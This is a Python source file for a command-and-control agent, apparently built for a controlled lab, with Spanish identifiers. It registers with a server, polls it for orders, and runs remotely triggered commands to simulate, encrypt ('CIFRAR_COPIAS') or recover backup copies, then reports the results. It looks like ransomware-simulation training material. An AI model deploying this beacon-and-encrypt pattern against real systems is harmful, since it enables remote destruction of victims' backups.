from __future__ import annotations

import argparse
import socket
import time
from pathlib import Path

import requests

from .crypto import encrypt_copies, recover_copies, simulate


def execute(command: str, base: Path) -> tuple[str, dict]:
    if command == "SIMULAR":
        result = simulate(base)
        return "SIMULACION_COMPLETADA", result
    if command == "CIFRAR_COPIAS":
        result = encrypt_copies(base)
        return "CIFRADO_COPIAS_COMPLETADO", result
    if command == "RECUPERAR_COPIAS":
        result = recover_copies(base)
        return "RECUPERACION_COPIAS_COMPLETADA", result
    raise ValueError("Comando no permitido")


def run(server: str, base: Path, agent_id: str, interval: int, once: bool) -> None:
    identity = {"id": agent_id, "equipo": socket.gethostname()}
    try:
        requests.post(server + "/api/agentes/registrar", json=identity, timeout=5)
    except requests.RequestException:
        pass
    print(f"Agente V5: {agent_id}")
    while True:
        try:
            payload = requests.post(server + "/api/poll", json={"id": agent_id}, timeout=5).json()
            command, order_id = payload.get("comando"), payload.get("orden_id")
            if command:
                state, result = execute(command, base)
                requests.post(server + "/api/resultado", json={"orden_id": order_id, "estado": state, "resultado": result}, timeout=5)
                print(state, result)
        except requests.RequestException:
            pass
        if once:
            return
        time.sleep(interval)


def main() -> None:
    parser = argparse.ArgumentParser(description="Agente V5 de laboratorio controlado")
    parser.add_argument("--server", default="http://127.0.0.1:5000")
    parser.add_argument("--base", type=Path, default=Path("laboratorio"))
    parser.add_argument("--id", default=socket.gethostname())
    parser.add_argument("--interval", type=int, default=3)
    parser.add_argument("--once", action="store_true")
    args = parser.parse_args()
    run(args.server.rstrip("/"), args.base, args.id, args.interval, args.once)


if __name__ == "__main__":
    main()
